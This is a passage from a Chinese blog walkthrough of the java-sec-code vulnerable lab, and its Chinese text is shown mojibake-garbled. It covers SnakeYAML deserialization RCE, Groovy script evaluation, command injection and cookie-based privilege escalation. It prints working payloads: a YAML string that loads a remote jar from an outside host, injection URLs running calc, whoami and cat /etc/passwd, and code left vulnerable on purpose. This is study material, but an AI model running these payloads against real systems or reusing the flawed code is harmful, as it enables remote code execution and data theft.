å¯¹è±¡ï¼Œå°±å¯èƒ½ä¼šè¢«ååºåˆ—åŒ–å¹¶æ‰§è¡Œä»£ç ï¼Œå½¢æˆ RCE</span><br>    y.load(content);<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;/sec/yarm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">secYarm</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeConstructor</span>());<br>    y.load(content);<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>YAML ååºåˆ—åŒ–æ¼æ´</strong> ,åˆ©ç”¨ SnakeYAML é»˜è®¤æ„é€ å™¨ï¼ˆååºåˆ—åŒ–ï¼‰+ JDK ç±»åŠ è½½æœºåˆ¶ï¼Œè¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ çš„æ”»å‡»ã€‚</p><p>æ”»å‡»æ ¸å¿ƒç‚¹åœ¨äºï¼š</p><blockquote><p><strong>æ„é€  ScriptEngineManager å¹¶ä¼ å…¥ä¸€ä¸ªè¿œç¨‹ URLClassLoaderï¼Œä»è€Œè§¦å‘æ¶æ„ç±»åŠ è½½æˆ–è„šæœ¬æ‰§è¡Œã€‚</strong></p><p>SnakeYamlååºåˆ—åŒ–æ¼æ´ç ”ç©¶:<a href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p></blockquote><p>è¿™æ˜¯æºç ä¸­ä½œè€…ç»™å‡ºçš„ä¸€ä¸ªpoc</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20</span>[<span class="hljs-string">!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22</span>]]]]<br><br></code></pre></td></tr></table></figure><p>yaml-payload.jar:<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>ä¸‹è½½å¥½åå¼€å§‹æ‰“åŒ…ä¸º jarï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">javac <span class="hljs-attribute">src</span>/artsploit/AwesomeScriptEngineFactory<span class="hljs-selector-class">.java</span> <br><br>jar -cvf yaml-payload<span class="hljs-selector-class">.jar</span> -C <span class="hljs-attribute">src</span>/ .<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928242.png" alt="20250722153817282"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928271.png" alt="20250722153829103"></p><p>å°†æ‰“åŒ…å¥½çš„æ–‡ä»¶  yaml-payload.jar æ”¾å…¥æœåŠ¡å™¨æ–‡ä»¶å¤¹ï¼Œå¼€å¯HTTP</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929506.png" alt="20250722154012661"></p><p>è§¦å‘æ¼æ´ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1:8081/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20</span>[<span class="hljs-string">!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://localhost:8000/yaml-payload.jar%22</span>]]]]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928486.png" alt="20250722155011777"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929891.png" alt="20250722155022447"></p><h4 id="5-groovy"><a href="#5-groovy" class="headerlink" title="5.groovy"></a>5.groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;groovy&quot;)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">groovyshell</span><span class="hljs-params">(String content)</span> &#123;<br>       <span class="hljs-comment">//GroovyShell æ˜¯ Groovy æä¾›çš„è„šæœ¬è§£é‡Šå™¨ï¼Œå¯ä»¥åœ¨ Java ç¨‹åºä¸­åŠ¨æ€æ‰§è¡Œ Groovy ä»£ç </span><br>       <span class="hljs-type">GroovyShell</span> <span class="hljs-variable">groovyShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>();<br>       <span class="hljs-comment">//å°†ç”¨æˆ·ä¼ å…¥çš„è„šæœ¬å†…å®¹ä½œä¸º Groovy ä»£ç ,ç«‹å³æ‰§è¡Œ</span><br>       groovyShell.evaluate(content);<br>   &#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rce/groovy?<span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;calc&quot;</span>.execute()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929076.png" alt="20250722155651468"></p><h2 id="å‘½ä»¤æ³¨å…¥-Cmd-Inject"><a href="#å‘½ä»¤æ³¨å…¥-Cmd-Inject" class="headerlink" title="å‘½ä»¤æ³¨å…¥-Cmd Inject"></a>å‘½ä»¤æ³¨å…¥-Cmd Inject</h2><p>æºç ä½ç½®ï¼šsrc&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CommandInject.java</p><h3 id="1-codeinject"><a href="#1-codeinject" class="headerlink" title="1.&#x2F;codeinject"></a>1.&#x2F;codeinject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/codeinject&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInject</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<span class="hljs-comment">//GET è¯·æ±‚ï¼Œæ¥æ”¶ filepath å‚æ•°</span><br>        <span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;<span class="hljs-comment">//å¯åŠ¨ cmd ï¼Œ/c æ‰§è¡Œåå…³é—­ç»ˆç«¯ï¼Œdir filepath åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ï¼›æ­¤å¤„ç›´æ¥æ‹¼æ¥äº†ç”¨æˆ·è¾“å…¥ï¼Œå­˜åœ¨ RCE æ¼æ´ã€‚</span><br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<span class="hljs-comment">//ä½¿ç”¨ä¸Šé¢æ„å»ºçš„å‘½ä»¤æ•°ç»„åˆ›å»ºè¿›ç¨‹</span><br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<span class="hljs-comment">//å°†æ ‡å‡†é”™è¯¯æµï¼ˆstderrï¼‰åˆå¹¶åˆ°æ ‡å‡†è¾“å‡ºæµï¼ˆstdoutï¼‰ï¼Œæ–¹ä¾¿ç»Ÿä¸€è¯»å–</span><br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<span class="hljs-comment">//å¯åŠ¨è¿›ç¨‹ï¼Œæ‰§è¡Œå‘½ä»¤</span><br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<span class="hljs-comment">//è·å–å‘½ä»¤æ‰§è¡Œåçš„æ ‡å‡†è¾“å‡ºæµ</span><br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProcessBuilder</span><span class="hljs-params">(String... command)</span> &#123;<br>        <span class="hljs-built_in">this</span>.command = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(command.length);<br>        <span class="hljs-keyword">for</span> (String arg : command)<br>            <span class="hljs-built_in">this</span>.command.add(arg);<br>    &#125;<br>    <br> <span class="hljs-keyword">public</span> ProcessBuilder <span class="hljs-title function_">redirectErrorStream</span><span class="hljs-params">(<span class="hljs-type">boolean</span> redirectErrorStream)</span> &#123;<br>        <span class="hljs-built_in">this</span>.redirectErrorStream = redirectErrorStream;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>calc.exe<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>ipconfig<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>whoami<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=%<span class="hljs-number">7</span>Cwhoami<br></code></pre></td></tr></table></figure><ul><li>æ³¨æ„å°†ç¬¦å·è¿›è¡Œ url ç¼–ç <ul><li>&amp; - .%26 - æ‹¼æ¥cmdå‘½ä»¤</li><li>| - %7C - æ‰§è¡Œå¤šæ¡å‘½ä»¤</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929661.png" alt="20250723130014199"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929041.png" alt="20250723130045224"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929093.png" alt="20250723130103166"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930759.png" alt="20250723130116070"></p><p>Linuxï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8080/codeinject?filepath=/tmp;<span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h3 id="2-codeinject-host"><a href="#2-codeinject-host" class="headerlink" title="2.&#x2F;codeinject&#x2F;host"></a>2.&#x2F;codeinject&#x2F;host</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/host&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectHost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;host&quot;</span>);<br>        logger.info(host);<br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;curl &quot;</span> + host&#125;;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>æ³¨å…¥å‚æ•°ä¸ºhttpè¯·æ±‚å¤´ä¸­çš„hostå‚æ•°ï¼Œå°†hostå‚æ•°ä¿®æ”¹ä¸º <code>payloadï¼šlocalhost&amp;ipconfig</code>ï¼Œæ‰§è¡Œå‘½ä»¤</p><p>BUG: Codeinjectçš„hostéƒ¨åˆ†ç”±äºpom.xmlæ›´æ–°äº†tomcat ç‰ˆæœ¬å¯¼è‡´æ‰“ä¸é€š:</p><p><a href="https://github.com/JoyChou93/java-sec-code/issues/78">https://github.com/JoyChou93/java-sec-code/issues/78</a></p><h3 id="3-codeinject-sec"><a href="#3-codeinject-sec" class="headerlink" title="3.&#x2F;codeinject&#x2F;sec"></a>3.&#x2F;codeinject&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectSec</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filterFilePath</span> <span class="hljs-operator">=</span> SecurityUtil.cmdFilter(filepath);<span class="hljs-comment">//è°ƒç”¨äº†è‡ªå®šä¹‰çš„å®‰å…¨ç±»</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == filterFilePath) &#123;<span class="hljs-comment">//å¦‚æœ cmdFilter æ–¹æ³•è¿”å› null ï¼Œè¿›è¡Œæ‹¦æˆª</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad boy. I got u.&quot;</span>;<br>    &#125;<br>    String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;ls -la &quot;</span> + filterFilePath&#125;;<span class="hljs-comment">//Linux ä¸‹çš„ shell å‘½ä»¤</span><br>    <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>    builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>    <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityUtil</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">FILTER_PATTERN</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(SecurityUtil.class);<br><br>...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">cmdFilter</span><span class="hljs-params">(String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!FILTER_PATTERN.matcher(input).matches()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> input;<br>    &#125;<br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</code>:</p><ul><li><p><code>^</code> å’Œ <code>$</code>ï¼šè¡¨ç¤ºæ•´ä¸ªå­—ç¬¦ä¸²å¿…é¡»ä»å¤´åˆ°å°¾éƒ½ç¬¦åˆä¸­é—´çš„è§„åˆ™ã€‚</p></li><li><p><code>[a-zA-Z0-9_/\\.-]+</code>ï¼š</p><ul><li><p><code>a-zA-Z0-9</code>ï¼šå¤§å°å†™å­—æ¯å’Œæ•°å­—</p></li><li><p><code>_</code>ï¼šå…è®¸ä¸‹åˆ’çº¿</p></li><li><p><code>/</code>ï¼šå…è®¸æ­£æ–œæ ï¼ˆè·¯å¾„åˆ†éš”ç¬¦ï¼‰</p></li><li><p><code>.</code>ï¼šå…è®¸ç‚¹å·ï¼ˆå¦‚éšè—æ–‡ä»¶ã€æ‰©å±•åï¼‰</p></li><li><p><code>-</code>ï¼šå…è®¸å‡å·</p></li></ul></li></ul><p>å¯ä»¥è¿‡æ»¤çš„å¨èƒï¼š</p><ul><li><code>;</code>, <code>&amp;</code>, <code>|</code>, <code>$</code>, <code>\</code>ï¼ˆé™¤è·¯å¾„åˆ†éš”ç¬¦ï¼‰, <code>*</code>, ç©ºæ ¼ã€æ¢è¡Œã€å¼•å·ç­‰</li></ul><h2 id="cookiesè¶Šæƒ"><a href="#cookiesè¶Šæƒ" class="headerlink" title="cookiesè¶Šæƒ"></a>cookiesè¶Šæƒ</h2><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Cookies.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> org.joychou.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.CookieValue;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.joychou.util.WebUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.springframework.web.util.WebUtils.getCookie;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æŸäº›åº”ç”¨è·å–ç”¨æˆ·èº«ä»½ä¿¡æ¯å¯èƒ½ä¼šç›´æ¥ä»cookieä¸­ç›´æ¥è·å–æ˜æ–‡çš„nickæˆ–è€…idï¼Œå¯¼è‡´è¶Šæƒé—®é¢˜ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/cookie&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cookies</span> &#123;<br><br>    <span class="hljs-comment">//è¡¨ç¤º Cookie ä¸­ç”¨äºè¡¨ç¤ºç”¨æˆ·æ˜µç§°çš„é”®</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">NICK</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nick&quot;</span>;<br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln01&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln01</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-comment">//è°ƒç”¨ getCookieValueByName æ–¹æ³•è·å– cookie ä¸­çš„ nick å€¼</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> WebUtils.getCookieValueByName(req, NICK); <span class="hljs-comment">// key code</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public class WebUtils &#123;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    public static String getCookieValueByName(HttpServletRequest request, String cookieName) &#123;</span><br><span class="hljs-comment">        Cookie cookie = org.springframework.web.util.WebUtils.getCookie(request, cookieName);</span><br><span class="hljs-comment">        return cookie == null ? null : cookie.getValue();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"> */</span><br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln02&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln02</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie[] cookie = req.getCookies();<br><br>        <span class="hljs-keyword">if</span> (cookie != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">//è°ƒç”¨ getCookie æ–¹æ³•è·å– cookie ä¸­çš„ nick å€¼</span><br>            nick = getCookie(req, NICK).getValue();  <span class="hljs-comment">// key code</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public class WebUtils &#123;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    public static Cookie getCookie(HttpServletRequest request, String name) &#123;</span><br><span class="hljs-comment">        Assert.notNull(request, &quot;Request must not be null&quot;);</span><br><span class="hljs-comment">        Cookie[] cookies = request.getCookies();</span><br><span class="hljs-comment">        if (cookies != null) &#123;</span><br><span class="hljs-comment">            for(Cookie cookie : cookies) &#123;</span><br><span class="hljs-comment">                if (name.equals(cookie.getName())) &#123;</span><br><span class="hljs-comment">                    return cookie;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        return null;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    */</span><br>    <br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln03&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln03</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie cookies[] = req.getCookies();<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//éå†æ‰€æœ‰ cookie ï¼Œæ‰¾ name ä¸º nick</span><br>            <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>                <span class="hljs-comment">// key code. Equals can also be equalsIgnoreCase.</span><br>                <span class="hljs-comment">//equals() æ˜¯å¤§å°å†™æ•æ„Ÿ</span><br>                <span class="hljs-keyword">if</span> (NICK.equals(cookie.getName())) &#123;<br>                    nick = cookie.getValue();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln04&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln04</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie cookies[] = req.getCookies();<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>                <span class="hljs-comment">//ä½¿ç”¨ equalsIgnoreCase()ï¼Œæ”¯æŒä¸åŒºåˆ†å¤§å°å†™åŒ¹é… Cookie åç§°ã€‚</span><br>                <span class="hljs-keyword">if</span> (cookie.getName().equalsIgnoreCase(NICK)) &#123;  <span class="hljs-comment">// key code</span><br>                    nick = cookie.getValue();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln05&quot;)</span><br>    <span class="hljs-comment">//ä½¿ç”¨ Spring æ³¨è§£ @CookieValue(&quot;nick&quot;) è‡ªåŠ¨æ³¨å…¥åä¸º nick çš„ cookie å€¼ã€‚</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln05</span><span class="hljs-params">(<span 